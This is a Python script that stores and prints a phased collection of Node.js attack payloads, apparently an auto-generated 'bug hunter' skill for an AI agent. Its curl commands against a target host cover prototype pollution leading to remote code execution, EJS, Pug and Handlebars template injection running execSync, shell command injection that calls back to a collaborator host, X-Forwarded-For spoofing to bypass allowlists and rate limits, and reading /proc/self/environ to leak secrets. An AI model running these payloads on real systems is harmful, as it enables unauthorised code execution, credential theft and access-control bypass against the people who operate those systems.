#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-nodejs

Skill: HUNT-NODEJS — Node.js Specific Vulnerabilities
Desc : Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.

Run:  python claude-bughunter-hunt-nodejs.py --help
      python claude-bughunter-hunt-nodejs.py --list
      python claude-bughunter-hunt-nodejs.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-nodejs'
TITLE = 'HUNT-NODEJS — Node.js Specific Vulnerabilities'
DESCRIPTION = 'Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.'

PAYLOADS = {
    'main': ["name: hunt-nodejs", "description: Hunt Node.js specific vulnerabilities \u2014 Prototype Pollution \u2192 RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.", "sources: hackerone_public, snyk_research, portswigger_research", "report_count: 24"],
    'hunt-nodejs-node-js-specific-vulnerabilities': [],
    'crown-jewel-targets': ["Prototype Pollution reaching a sink in Node.js backend = Critical RCE.", "**Highest-value chains:**", "- **Prototype Pollution \u2192 RCE** \u2014 `__proto__` injection via `lodash.merge` / `Object.assign` \u2192 polluted prototype reaches `child_process.exec` or `vm.runInNewContext` sink", "- **Express trust proxy** \u2014 `app.set('trust proxy', true)` without validation \u2192 attacker sets `X-Forwarded-For` to bypass IP allowlists or rate limits", "- **EJS/Pug SSTI** \u2014 template engine receives user input \u2192 `{{= process.mainModule.require('child_process').execSync('id') }}`", "- **`child_process` injection** \u2014 user input interpolated into shell command string \u2192 OS command injection", "- **`require()` path traversal** \u2014 attacker-controlled module path \u2192 load arbitrary file as JS"],
    'attack-surface-signals': ["X-Powered-By: Express           Confirms Express.js", "Node.js in error messages        Runtime detected", "package.json exposed             Dependency list + versions", "/proc/self/environ accessible    Environment variable exfil", "Error stack traces with .js paths  Node.js confirmed", "__proto__ in JSON accepted        Prototype pollution candidate"],
    'phase-1-fingerprint': ["```bash"],
    'confirm-node-js-express': ["curl -sI https://$TARGET/ | grep -i \"x-powered-by\\|nodejs\\|express\""],
    'check-for-package-json-node-modules-exposure': ["curl -s \"https://$TARGET/package.json\"", "curl -s \"https://$TARGET/package-lock.json\"", "curl -s \"https://$TARGET/node_modules/.package-lock.json\""],
    'error-based-version-detection': ["curl -s \"https://$TARGET/nonexistent-path-xyz\" | grep -i \"node\\|express\\|cannot GET\""],
    'phase-2-prototype-pollution-detection': ["```bash"],
    'json-body-injection-test-if-proto-is-accepted': ["curl -s -X POST https://$TARGET/api/merge \\", "-H \"Content-Type: application/json\" \\", "-d '{\"__proto__\": {\"polluted\": \"yes\"}}'"],
    'constructor-prototype': ["curl -s -X POST https://$TARGET/api/settings \\", "-H \"Content-Type: application/json\" \\", "-d '{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}'"],
    'url-query-param-injection-qs-library': ["curl -s \"https://$TARGET/api/search?__proto__[polluted]=yes&query=test\"", "curl -s \"https://$TARGET/api/data?constructor[prototype][admin]=1\""],
    'confirm-pollution-does-a-subsequent-request-reflect-the-polluted-key': ["curl -s \"https://$TARGET/api/me\" | grep -i \"polluted\\|isAdmin\\|admin\""],
    'phase-3-prototype-pollution-rce-chain': ["```bash"],
    'if-pollution-is-confirmed-attempt-to-reach-dangerous-sinks': [],
    'sink-1-child-process-via-options-shell-pollution': ["curl -s -X POST https://$TARGET/api/update \\", "-H \"Content-Type: application/json\" \\", "-d '{", "\"__proto__\": {", "\"shell\": \"node\",", "\"NODE_OPTIONS\": \"--require /proc/self/fd/0\",", "\"env\": {\"NODE_OPTIONS\": \"--inspect=COLLAB_HOST\"}"],
    'sink-2-lodash-template-pollution-cve-2021-23337': ["curl -s -X POST https://$TARGET/api/render \\", "-H \"Content-Type: application/json\" \\", "-d '{\"__proto__\": {\"sourceURL\": \"\\nreturn process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\").toString()//\"}}'"],
    'sink-3-ejs-template-options-pollution': [],
    'if-ejs-is-used-for-rendering-pollute-the-opts-escapexml-or-opts-outputfunctionname': ["curl -s -X POST https://$TARGET/api/template \\", "-H \"Content-Type: application/json\" \\", "-d '{\"__proto__\": {\"outputFunctionName\": \"x;process.mainModule.require(\\\"child_process\\\").execSync(\\\"curl COLLAB_HOST/pp-rce\\\");x\"}}'"],
    'oob-confirmation-check-interactsh-for-callback': [],
    'phase-4-express-trust-proxy-abuse': ["```bash"],
    'if-express-has-trust-proxy-enabled-x-forwarded-for-is-trusted': [],
    'test-does-spoofed-ip-bypass-ip-based-rate-limiting-or-allowlist': [],
    'spoof-ip-to-127-0-0-1-localhost-bypass': ["curl -s -X POST https://$TARGET/api/admin/action \\", "-H \"X-Forwarded-For: 127.0.0.1\" \\", "-H \"Content-Type: application/json\" \\", "-d '{\"action\": \"test\"}'"],
    'spoof-to-internal-ip-range': ["curl -s -X POST https://$TARGET/api/internal \\", "-H \"X-Forwarded-For: 10.0.0.1\" \\", "-H \"X-Real-IP: 10.0.0.1\""],
    'rate-limit-bypass-via-rotating-fake-ips': ["for i in $(seq 1 50); do", "curl -s https://$TARGET/api/login \\", "-H \"X-Forwarded-For: 1.2.3.$i\" \\", "-d '{\"email\":\"admin@test.com\",\"password\":\"wrong\"}' \\", "-o /dev/null -w \"$i: %{http_code}\\n\""],
    'phase-5-template-engine-ssti-ejs-pug-handlebars': ["```bash"],
    'ejs-ssti-if-user-input-reaches-ejs-template-context': [],
    'test-basic-7-7-should-return-49': ["curl -s -X POST https://$TARGET/api/render \\", "-H \"Content-Type: application/json\" \\", "-d '{\"template\": \"<%= 7*7 %>\"}'"],
    'ejs-rce-payload': ["curl -s -X POST https://$TARGET/api/render \\", "-H \"Content-Type: application/json\" \\", "-d '{\"template\": \"<%= process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\").toString() %>\"}'"],
    'pug-ssti': ["curl -s -X POST https://$TARGET/api/render \\", "-H \"Content-Type: application/json\" \\", "-d '{\"template\": \"- var x = root.process\\n= x.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\")\"}'"],
    'handlebars-prototype-pollution-via-template': ["curl -s -X POST https://$TARGET/api/render \\", "-H \"Content-Type: application/json\" \\", "-d '{\"template\": \"{{#with \\\"s\\\" as |string|}}{{#with \\\"e\\\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \\\"constructor\\\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \\\"return process.mainModule.require(childprocess).execSync(id)\\\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}\"}'"],
    'phase-6-child-process-command-injection': ["```bash"],
    'look-for-endpoints-that-run-shell-commands-with-user-input': [],
    'signals-api-convert-api-exec-api-ping-api-scan': [],
    'basic-injection-test': ["curl -s \"https://$TARGET/api/ping?host=127.0.0.1;id\"", "curl -s \"https://$TARGET/api/convert?file=test.pdf;curl+COLLAB_HOST/ci\"", "curl -s -X POST https://$TARGET/api/exec \\", "-H \"Content-Type: application/json\" \\", "-d '{\"command\": \"ls\", \"args\": [\"&&\", \"curl\", \"COLLAB_HOST/ci\"]}'"],
    'oob-via-dns': ["curl -s \"https://$TARGET/api/dns?host=\\$(curl+COLLAB_HOST/dns-ci).example.com\""],
    'phase-7-proc-self-environ-exfil': ["```bash"],
    'if-lfi-exists-on-node-js-app-proc-self-environ-leaks-env-vars': ["curl -s \"https://$TARGET/api/file?path=/proc/self/environ\"", "curl -s \"https://$TARGET/api/read?file=../../../../proc/self/environ\""],
    'also-check': ["curl -s \"https://$TARGET/api/file?path=/proc/self/cmdline\"  # full command line", "curl -s \"https://$TARGET/api/file?path=/proc/self/cwd\"       # working directory"],
    'chain-table': [],
    'validation': ["\u2705 Prototype pollution: key appears in subsequent API responses without being sent", "\u2705 RCE chain: OOB callback received OR `id` output in response", "\u2705 Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist", "**Severity:**", "- Prototype pollution \u2192 RCE: Critical", "- SSTI \u2192 RCE: Critical", "- child_process injection: Critical", "- Trust proxy \u2192 rate limit bypass: Medium", "- /proc/self/environ exfil: High (if cloud keys present)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()